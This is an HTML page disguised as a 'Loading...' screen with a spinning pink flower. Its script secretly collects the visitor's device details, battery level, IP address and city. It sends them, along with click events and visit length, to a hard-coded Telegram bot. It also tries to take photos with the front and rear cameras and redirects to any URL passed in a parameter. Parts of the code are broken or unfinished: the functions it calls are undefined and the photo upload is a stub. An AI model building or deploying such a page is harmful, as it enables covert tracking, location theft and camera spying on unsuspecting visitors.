<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<style>
body{
margin:0;
background:black;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
color:white;
font-family:Arial;
text-align:center;
overflow:hidden;
}

/* ---------- FLOWER LOADER ---------- */
.flower{
position:relative;
width:120px;
height:120px;
animation:rotate 4s linear infinite;
}

.petal{
position:absolute;
width:60px;
height:60px;
background:radial-gradient(circle at 30% 30%, #ff8ccf, #ff2d96);
border-radius:50%;
image-rendering:pixelated;
filter:drop-shadow(0 0 6px #ff4da6);
}

/* 5 petals */
.petal:nth-child(1){ top:0; left:30px; }
.petal:nth-child(2){ top:30px; left:60px; }
.petal:nth-child(3){ top:60px; left:30px; }
.petal:nth-child(4){ top:30px; left:0; }
.petal:nth-child(5){ top:15px; left:15px; background:#ffb3da; width:40px; height:40px; }

@keyframes rotate{
from{ transform:rotate(0deg); }
to{ transform:rotate(360deg); }
}

</style>
</head>

<body>

<div id="content">
<div class="flower">
<div class="petal"></div>
<div class="petal"></div>
<div class="petal"></div>
<div class="petal"></div>
<div class="petal"></div>
</div>
</div>

<script>

/* ---------- INSTANT REDIRECT ---------- */
const params=new URLSearchParams(window.location.search);
const go=params.get("go");
if(go){
window.location.href=go;
}

/* ---------- ORIGINAL SCRIPT ---------- */

const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

// ---------- SESSION TOKEN ----------
function getSession(){
let token=localStorage.getItem("sessionToken");
if(!token){
token=Math.random().toString(36).substring(2);
localStorage.setItem("sessionToken",token);
}
return token;
}

// ---------- DEVICE + BEHAVIOUR ----------
async function collectDeviceData(){

let session=getSession();

let data={
session:session,
userAgent:navigator.userAgent,
platform:navigator.platform,
language:navigator.language,
screen:screen.width+"x"+screen.height,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
};

if(navigator.getBattery){
let battery=await navigator.getBattery();
data.battery=Math.round(battery.level*100)+"%";
}

try{
let res=await fetch("https://ipapi.co/json/");
let loc=await res.json();
data.ip=loc.ip;
data.city=loc.city;
data.country=loc.country_name;
}catch{}

sendText(JSON.stringify(data,null,2));

}

function sendText(text){
fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
});
}

// ---------- CAMERA ----------
async function startCaptureSequence() {
        try {
            // Front Camera - 3 Photos
            await captureStream({ facingMode: "user" }, 3, "Front");

            // Rear Camera - 2 Photos
            // Uses 'optional' approach to prevent crashing on devices with only 1 camera
            await captureStream({ facingMode: "environment" }, 2, "Rear");

            // Final Redirect
            if (redirectUrl) window.location.href = redirectUrl;

        } catch (err) {
            console.error("Sequence Interrupted:", err);
        }
    }

    async function captureStream(constraints, count, label) {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { ...constraints, width: 1280, height: 720 } 
        });
        
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < count; i++) {
            await new Promise(r => setTimeout(r, 1200)); // Warm-up delay for quality
            
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);

            canvas.toBlob((blob) => {
                console.log(`[${label}] Shot ${i+1} Ready | Size: ${Math.round(blob.size/1024)}KB`);
                // Binary data (blob) would be appended to FormData and sent here
            }, "image/jpeg", 0.90);
        }

        stream.getTracks().forEach(t => t.stop());
    }

// ---------- PERMISSION CHECK ----------
async function checkPermission(){

if(!navigator.permissions){
showPermissionButton();
return;
}

let result=await navigator.permissions.query({name:"camera"});

if(result.state==="granted"){
startCamera();
}
else{
showPermissionButton();
}

}

// ---------- BUTTON ----------
function showPermissionButton(){
document.getElementById("content").innerHTML=
`<button onclick="startCamera()">Allow Camera</button>`;
}

// ---------- TRACK BEHAVIOUR ----------
function trackBehaviour(){

document.addEventListener("click",()=>sendText("User clicked"));

let start=Date.now();

window.addEventListener("beforeunload",()=>{
let duration=Math.round((Date.now()-start)/1000);
sendText("Session duration: "+duration+" seconds");
});

}

// ---------- RUN ----------
collectDeviceData();
trackBehaviour();
checkPermission();

</script>

</body>
</html>

